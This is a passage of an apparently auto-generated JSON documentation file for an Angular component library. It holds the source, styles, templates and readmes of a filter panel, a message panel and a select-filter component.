});\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n      <ng-content></ng-content>\n      <mat-button-toggle class=\"icon\"\n                         *ngIf=\"expandable\"\n                         style=\"box-shadow:none\"\n                         [checked]=\"expanded\"\n                         (change)=\"onChange($event)\"\n                         title=\"Toggle filter panel\"\n                         (click)=\"toggle.emit()\">\n          <mat-icon>filter_list</mat-icon>\n      </mat-button-toggle>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@use '~@angular/material' as mat;\n\n$sto-filter-header-font-size: 18px;\n$sto-filter-header-line-height: 24px;\n$sto-filter-header-elevation: 2;\n\n.sto-filter {\n\n  .mat-button-toggle {\n    &-standalone.mat-button-toggle-appearance-standard {\n      border: 0;\n    }\n  }\n\n  box-shadow: none !important;\n\n  border-top-left-radius: 3px;\n  border-top-right-radius: 3px;\n\n  .mat-expansion-panel {\n    border-radius: 2px;\n  }\n\n  .mat-expansion-panel-header {\n    @include mat.elevation($sto-filter-header-elevation);\n    padding: 0 8px;\n    cursor: default;\n    border-bottom-left-radius: 0;\n    border-bottom-right-radius: 0;\n\n    &.mat-expanded {\n      border-bottom: solid 1px transparent;\n    }\n\n    &-title {\n      align-items: center;\n    }\n  }\n\n  .mat-expansion-panel-content {\n\n    @include mat.elevation(1);\n  }\n\n  .mat-expansion-panel-body {\n    padding: 24px 16px 0 16px;\n    margin: 0;\n  }\n\n  .mat-expansion-panel-header[aria-disabled=true] {\n    color: inherit;\n  }\n\n\n  .sto-filter-table-actions {\n\n    padding: 0 8px;\n\n  }\n\n  .sto-filter-actions {\n    padding: 0 0 0 8px;\n\n\n  }\n\n  sto-filter-actions {\n    height: 32px;\n  }\n\n  .sto-filter-table-actions, .sto-filter-actions {\n    display: flex;\n    align-items: center;\n\n    .mat-icon {\n      cursor: pointer;\n    }\n\n    .mat-icon-button {\n    }\n  }\n\n\n  .mat-expansion-panel-header {\n    border-radius: 2px;\n  }\n\n\n  .mat-button-toggle-standalone {\n    width: 32px;\n    height: 32px;\n\n    .mat-button-toggle-label {\n      margin: 0;\n    }\n\n    .mat-button-toggle-label-content {\n      height: 100%;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n    }\n  }\n\n  .separator {\n    display: inline-block;\n    width: 1px;\n    height: 24px;\n    margin: 8px 4px;\n  }\n\n  .content-wrapper {\n    display: flex;\n  }\n\n\n}\n\n",
                    "styleUrl": "./sto-filter-panel.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    },
                    {
                        "name": "vcRef",
                        "type": "ViewContainerRef"
                    }
                ],
                "line": 81,
                "jsdoctags": [
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "vcRef",
                        "type": "ViewContainerRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "AfterViewInit"
            ],
            "accessors": {
                "contentHeight": {
                    "name": "contentHeight",
                    "setSignature": {
                        "name": "contentHeight",
                        "type": "void",
                        "args": [
                            {
                                "name": "contentHeight",
                                "type": "number"
                            }
                        ],
                        "returnType": "void",
                        "line": 28,
                        "jsdoctags": [
                            {
                                "name": "contentHeight",
                                "type": "number",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "contentHeight",
                        "type": "number",
                        "returnType": "number",
                        "line": 32
                    }
                }
            },
            "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>",
            "templateData": "<mat-expansion-panel [disabled]=\"true\"\n                     [expanded]=\"expanded\"\n                     #panel\n                     [hideToggle]=\"true\"\n                     [ngClass]=\"{'sto-filter' : true}\">\n  <mat-expansion-panel-header [expandedHeight]=\"'40px'\"\n                              [collapsedHeight]=\"'40px'\">\n    <mat-panel-title>\n      <ng-content select=\"sto-filter-title\"></ng-content>\n      <mat-chip-list [style.opacity]=\"panel.expanded ? 0 : 1\"\n                     *ngIf=\"filterList\"\n                     style=\"margin-left: 16px\">\n        <mat-chip (removed)=\"_clearFilter(f.key, f.index)\"\n                  *ngFor=\"let f of filterList\"\n                  [removable]=\"true\"\n                  [selected]=\"true\"\n                  [value]=\"f.key\"\n                  style=\"margin: 2px 4px\">\n          <span style=\"margin-bottom: -4px\">{{ f.value }}</span>\n          <mat-icon matChipRemove>cancel</mat-icon>\n\n        </mat-chip>\n      </mat-chip-list>\n    </mat-panel-title>\n    <span class=\"content-wrapper\"\n          #tableActions>\n      <ng-content select=\"sto-filter-table-actions\">\n\n      </ng-content>\n\n    </span>\n\n    <span class=\"separator\"\n          *ngIf=\"hasSeperator\">\n    </span>\n    <span class=\"content-wrapper\"\n          #filterActions>\n      <sto-filter-actions-bar #contentWrapper2\n                              *ngIf=\"expandable\"\n                              [expanded]=\"expanded\"\n                              [expandable]=\"expandable\"\n                              (toggle)=\"toggle()\">\n\n        <ng-content select=\"sto-filter-actions\"></ng-content>\n\n      </sto-filter-actions-bar>\n    </span>\n  </mat-expansion-panel-header>\n  <div class=\"sto-filter-form\"\n       #filterForm>\n    <ng-content></ng-content>\n  </div>\n</mat-expansion-panel>\n\n"
        },
        {
            "name": "StoMessagePanelComponent",
            "id": "component-StoMessagePanelComponent-6758de68d1a1c256689463f219f125d4",
            "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-message-panel",
            "styleUrls": [
                "./sto-message-panel.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-message-panel.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "color",
                    "defaultValue": "'primary'",
                    "line": 41,
                    "type": "\"primary\" | \"accent\" | \"warning\" | \"danger\" | \"success\""
                },
                {
                    "name": "dismissable",
                    "description": "<p>Determines if the message can be dismissed - typically used for showing and hiding errors.</p>\n",
                    "line": 73,
                    "type": "boolean"
                },
                {
                    "name": "icon",
                    "defaultValue": "'info'",
                    "line": 65,
                    "type": "\"info\" | \"warning\" | \"error\""
                },
                {
                    "name": "severity",
                    "defaultValue": "'info'",
                    "line": 63,
                    "type": "\"info\" | \"warning\" | \"error\""
                }
            ],
            "outputsClass": [
                {
                    "name": "dismissed",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits an event on (dismissed) when the user clicks the dismiss icon</p>\n",
                    "line": 69,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 98
                },
                {
                    "name": "ngOnChanges",
                    "args": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 78,
                    "jsdoctags": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDismissableClass",
                    "args": [
                        {
                            "name": "dismissable",
                            "type": "boolean"
                        },
                        {
                            "name": "el",
                            "type": "HTMLElement"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 90,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "dismissable",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "el",
                            "type": "HTMLElement",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "class.error",
                    "line": 54
                },
                {
                    "name": "class.info",
                    "line": 49
                },
                {
                    "name": "class.warning",
                    "line": 44
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnChanges,\n  Output,\n  SimpleChanges,\n  ViewEncapsulation\n} from '@angular/core';\n\n/**\n * Message panel to display inline info boxes.\n * Can be of severity warning, error or info.\n *\n * @example\n *\n * <sto-message-panel severity=\"warning\"></sto-message-panel>\n * <sto-message-panel severity=\"info\"></sto-message-panel>\n * <sto-message-panel severity=\"error\"></sto-message-panel>\n * <sto-message-panel *ngIf=\"err\" [dismissable]=\"true\"\n *    (dismissed)=\"err = null\" severity=\"warning\">{{ err }}</sto-message-panel>\n */\n\nconst COLORS = [\n  'primary', 'accent', 'warning', 'danger', 'success'\n];\n\n@Component({\n  selector: 'sto-message-panel',\n  templateUrl: './sto-message-panel.component.html',\n  styleUrls: [ './sto-message-panel.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  encapsulation: ViewEncapsulation.None\n})\nexport class StoMessagePanelComponent implements OnChanges, AfterViewInit {\n  @Input()\n  color: 'primary' | 'accent' | 'warning' | 'danger' | 'success' = 'primary';\n\n  @HostBinding('class.warning')\n  get warning() {\n    return this.severity === 'warning';\n  }\n\n  @HostBinding('class.info')\n  get info() {\n    return this.severity === 'info';\n  }\n\n  @HostBinding('class.error')\n  get error() {\n    return this.severity === 'error';\n  }\n\n  /**\n   * @deprecated\n   * severity was used to signify behaviour. Now you should use icon + color.\n   */\n  @Input()\n  severity: 'info' | 'warning' | 'error' = 'info';\n  @Input()\n  icon: 'info' | 'warning' | 'error' = 'info';\n  /**\n   * Emits an event on (dismissed) when the user clicks the dismiss icon\n   */\n  @Output() dismissed = new EventEmitter();\n  /**\n   * Determines if the message can be dismissed - typically used for showing and hiding errors.\n   */\n  @Input() dismissable: boolean;\n\n  constructor(private elRef: ElementRef<HTMLElement>) {\n  }\n\n  ngOnChanges(changes: SimpleChanges): void {\n    const el = this.elRef.nativeElement;\n    if ( changes.color ) {\n      el.classList.remove(...COLORS.map(c => `mat-${c}`));\n      el.classList.add(`mat-${changes.color.currentValue}`);\n    }\n    if ( changes.dismissable ) {\n      const dismissable = changes.dismissable.currentValue;\n      this.setDismissableClass(dismissable, el);\n    }\n  }\n\n  private setDismissableClass(dismissable: boolean, el: HTMLElement) {\n    if ( dismissable ) {\n      el.classList.add('sto-message-panel--dismissable');\n    } else {\n      el.classList.remove('sto-message-panel--dismissable');\n    }\n  }\n\n  ngAfterViewInit(): void {\n    const color = this.color;\n    this.elRef.nativeElement.classList.add(`mat-${color}`, 'sto-message-panel');\n    this.setDismissableClass(this.dismissable, this.elRef.nativeElement);\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-message-panel {\n  width: 100%;\n  border: 1px solid;\n  display: flex;\n  border-radius: 2px;\n  padding: 12px;\n\n  &--dismissable {\n    padding: 4px 12px;\n  }\n\n  position: relative;\n  font-weight: 500;\n  font-size: 13px;\n\n  &__content-wrapper {\n    align-items: center;\n  }\n}\n\n\n.sto-message-panel {\n  &__icon-wrapper {\n    display: flex;\n    flex-direction: column;\n    justify-content: center;\n    height: auto;\n    flex-grow: 1;\n    min-width: 42px;\n    max-width: 42px;\n  }\n  &__content-wrapper {\n    padding-top: 2px;\n    flex-grow: 99;\n  }\n  &__dismiss-wrapper {\n    display: flex;\n    flex-direction: column;\n    justify-content: center;\n    height: auto;\n    flex-grow: 1;\n    max-width: 42px;\n  }\n}\n\n::ng-deep ul {\n  margin: 0;\n  list-style: none;\n  padding: 0;\n}\n\n::ng-deep .mat-typography p {\n  margin: 0;\n}\n\n//SHOULD BE REWRITTEN OR REMOVE ENCAPSULATION\n\n.sto-message-panel__sticky {\n  position: sticky;\n  &--bottom {\n    padding-top: 8px;\n    bottom: 0;\n  }\n  &--top {\n    top: 0;\n    padding-bottom: 8px;\n  }\n  z-index: 25;\n}\n\n.sto-has-action-footer, .sto-message-panel__pad--bottom {\n  .sto-message-panel__sticky--bottom {\n    bottom: 76px;\n    width: 100%;\n  }\n}\n\nsto-message-panel {\n  .sto-message-panel__content-wrapper {\n    display: flex;\n  }\n  .sto-message-panel__action-button {\n    height: 24px;\n    line-height: 24px;\n  }\n}\n",
                    "styleUrl": "./sto-message-panel.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 73,
                "jsdoctags": [
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnChanges",
                "AfterViewInit"
            ],
            "readme": "<h3 id=\"stomessagepanel\">StoMessagePanel</h3>\n<p>StoMessagePanel is used to display contextual messages using 3 different modes - info, warning and error</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-message-panel [dismissable]=&quot;true|false&quot;\n(dismissed)=&quot;onDismiss()&quot;\ncolor=&quot;primary|accent|warn&quot;&gt;{{ message }}&lt;/sto-message-panel&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<ul>\n<li>[dismissable] determines if the alert can be dismissed. Note that the component does not handle dismissing, and you need to use the (dismissed) event yourself.</li>\n<li>[color] determines how the component should be styled. Uses Angular Material&#39;s ThemePalette</li>\n<li>[icon] determines the icon</li>\n</ul>\n<h5 id=\"outputs\">Outputs</h5>\n<ul>\n<li>(dismissed) emits when the close-button (X) is clicked to dismiss the message.</li>\n</ul>\n",
            "templateData": "<div class=\"sto-message-panel__icon-wrapper\">\n  <mat-icon>{{ icon + '_outline' || severity }}</mat-icon>\n</div>\n<div class=\"sto-message-panel__content-wrapper\">\n  <ng-content></ng-content>\n</div>\n<div *ngIf=\"dismissable\"\n     class=\"sto-message-panel__dismiss-wrapper mat__icon--clickable\">\n  <button mat-icon-button\n          (click)=\"dismissed.emit()\">\n    <mat-icon>close</mat-icon>\n  </button>\n</div>\n"
        },
        {
            "name": "StoSelectFilterComponent",
            "id": "component-StoSelectFilterComponent-a91d310861c668f1033a064ce4971e6f",
            "file": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [
                {
                    "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => StoSelectFilterComponent), multi: true\n}",
                    "type": "component"
                }
            ],
            "selector": "sto-select-filter",
            "styleUrls": [
                "./sto-select-filter.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-select-filter.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "focusIfNoValue",
                    "description": "<p>automatically focus input element if it&#39;s empty</p>\n",
                    "line": 137,
                    "type": "boolean"
                },
                {
                    "name": "isFilter",
                    "description": "<p>isFilter determines if filtering is active</p>\n",
                    "line": 133,
                    "type": "boolean"
                },
                {
                    "name": "isMulti",
                    "description": "<p>isMulti determines if select all is available</p>\n",
                    "line": 129,
                    "type": "boolean"
                },
                {
                    "name": "selected",
                    "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
                    "line": 82,
                    "type": "number"
                },
                {
                    "name": "total",
                    "description": "<p>Length of unfiltered Array</p>\n",
                    "line": 70,
                    "type": "number"
                },
                {
                    "name": "value",
                    "description": "<p>Initial value of the filter</p>\n",
                    "line": 57,
                    "type": ""
                }
            ],
            "outputsClass": [
                {
                    "name": "selectAll",
                    "defaultValue": "new EventEmitter<boolean>()",
                    "description": "<p>Emits when selectAll checkbox changes</p>\n",
                    "line": 120,
                    "type": "EventEmitter"
                },
                {
                    "name": "valueChanges",
                    "defaultValue": "new EventEmitter<unknown>()",
                    "description": "<p>Emits when the search value changes</p>\n",
                    "line": 124,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_selected",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 115,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_total",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 112,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_value",
                    "type": "unknown",
                    "optional": false,
                    "description": "",
                    "line": 109,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "checkboxControl",
                    "defaultValue": "new FormControl()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 104,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 138,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "indeterminate",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 107,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "inputControl",
                    "defaultValue": "new FormControl()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 105,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "inputElement",
                    "type": "ElementRef<HTMLInputElement>",
                    "optional": false,
                    "description": "",
                    "line": 102,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'inputElement'"
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "propagateChange",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 155
                },
                {
                    "name": "select",
                    "type": "MatSelect",
                    "optional": false,
                    "description": "",
                    "line": 141,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "isChecked",
                    "args": [
                        {
                            "name": "isChecked",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 144,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "isChecked",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 173
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 167
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 183
                },
                {
                    "name": "registerOnChange",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 159,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnTouched",
                    "args": [
                        {
                            "name": "fn",
                            "type": "unknown"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 164,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "unknown",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "writeValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "unknown"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 149,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "unknown",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "class.sto-select-filter",
                    "defaultValue": "true",
                    "line": 100
                }
            ],
            "hostListeners": [],
            "description": "<p>Component used in mat-select&#39;s to filter out the values, and adds a Select all checkbox</p>\n",
            "rawdescription": "Component used in mat-select's to filter out the values, and adds a Select all checkbox",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  Component,\n  ElementRef,\n  EventEmitter,\n  forwardRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, NG_VALUE_ACCESSOR } from '@angular/forms';\nimport { Subject } from 'rxjs';\nimport { takeUntil } from 'rxjs/operators';\nimport { MatSelect } from '@angular/material/select';\n\n/**\n * Component used in mat-select's to filter out the values, and adds a Select all checkbox\n *\n * @example\n *\n * public all = [\"a\", \"b\", \"c\"];\n * public filtered = [];\n * public selectAll(checked: boolean) {\n *  this.control.setValue(checked ? all : []);\n * }\n * public filter(val: string) {\n *    this.filtered = all.filter(x => x === val);\n * }\n * <mat-select [formControl]=\"control\">\n *   <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\n *   <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\n * </mat-select>\n */\n\n@Component({\n  selector: 'sto-select-filter',\n  templateUrl: './sto-select-filter.component.html',\n  styleUrls: [ './sto-select-filter.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  providers: [\n    {\n      provide: NG_VALUE_ACCESSOR,\n      useExisting: forwardRef(() => StoSelectFilterComponent),\n      multi: true\n    }\n  ]\n})\nexport class StoSelectFilterComponent implements OnInit, AfterViewInit, OnDestroy, ControlValueAccessor {\n\n  /**\n   * Initial value of the filter\n   */\n  @Input() set value(value: unknown) {\n    this._value = value;\n    this.writeValue(value);\n  }\n\n  get value(): unknown {\n    return this._value;\n  }\n\n  /**\n   * Length of unfiltered Array\n   * @param total\n   */\n  @Input() set total(total: number) {\n    this._total = total;\n  }\n\n  get total(): number {\n    return this._total;\n  }\n\n  /**\n   * Determines the checkbox state. Can be checked, indeterminate or unchecked\n   * @param selected\n   */\n  @Input() set selected(selected: number) {\n    if ( this.total === selected ) {\n      this.isChecked(true);\n      this.indeterminate = false;\n    } else if ( selected > 0 ) {\n      this.indeterminate = true;\n      this.isChecked(false);\n    } else {\n      this.indeterminate = false;\n      this.isChecked(false);\n    }\n    this._selected = selected;\n  }\n\n  get selected(): number {\n    return this._selected;\n  }\n\n  @HostBinding('class.sto-select-filter') cssClass = true;\n  @ViewChild('inputElement')\n  public inputElement: ElementRef<HTMLInputElement>;\n\n  public checkboxControl = new FormControl();\n  public inputControl = new FormControl();\n\n  public indeterminate: boolean;\n\n  private _value: unknown;\n\n\n  private _total: number;\n\n\n  private _selected: number;\n\n  /**\n   * Emits when selectAll checkbox changes\n   */\n  @Output() selectAll = new EventEmitter<boolean>();\n  /**\n   * Emits when the search value changes\n   */\n  @Output() valueChanges = new EventEmitter<unknown>();\n\n  /**\n   * isMulti determines if select all is available\n   */\n  @Input() isMulti: boolean;\n  /**\n   * isFilter determines if filtering is active\n   */\n  @Input() isFilter: boolean;\n  /**\n   * automatically focus input element if it's empty\n   */\n  @Input() focusIfNoValue: boolean;\n  private destroyed$ = new Subject();\n\n\n  constructor(public select: MatSelect) {\n  }\n\n  public isChecked(isChecked: boolean) {\n\n    this.checkboxControl.setValue(isChecked, { emitEvent: false });\n  }\n\n  writeValue(value: unknown) {\n    if ( value || value === '' ) {\n      this.inputControl.setValue(value);\n    }\n  }\n\n  propagateChange = (value: unknown) => {\n    this.valueChanges.emit(value);\n  };\n\n  registerOnChange(fn: never): void {\n    this.propagateChange = fn;\n  }\n\n  // eslint-disable-next-line\n  registerOnTouched(fn: unknown): void {\n  }\n\n  ngOnDestroy() {\n\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  ngAfterViewInit(): void {\n    if ( this.select ) {\n      this.select.openedChange.pipe(takeUntil(this.destroyed$)).subscribe(open => {\n        if ( open && this.focusIfNoValue && this.isMulti ) {\n          this.inputElement?.nativeElement.focus();\n        }\n      });\n    }\n  }\n\n  ngOnInit() {\n    this.checkboxControl.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      ).subscribe(isChecked => {\n      this.selectAll.emit(isChecked);\n    });\n\n    this.inputControl.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      ).subscribe(value => {\n      if ( !value && this.focusIfNoValue ) {\n        requestAnimationFrame(() => this.inputElement.nativeElement.focus());\n      }\n      this.propagateChange(value);\n    });\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
